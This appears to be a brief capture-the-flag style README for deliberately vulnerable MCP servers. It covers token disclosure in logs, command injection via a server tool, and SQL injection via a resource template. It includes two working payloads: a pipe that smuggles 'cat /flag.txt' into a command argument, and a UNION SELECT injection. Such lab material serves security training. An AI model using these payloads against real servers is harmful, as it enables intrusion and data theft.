# Vulnerable MCP Servers

MCP servers expose tools and resources that lack input validation.

## Lab 1: Information Disclosure

Bearer token leaked in server logs via resource://logs resource.

## Lab 2: Command Injection

Pipe injection via execute_server_command tool:
```python
await client.call_tool("execute_server_command", {"command": "date | cat /flag.txt"})
```

## Lab 3: SQL Injection via Resource Template

UNION SELECT via price://{item} template:
```python
await client.read_resource("price://x'%20UNION%20SELECT%20flag%20FROM%20flag--")
```
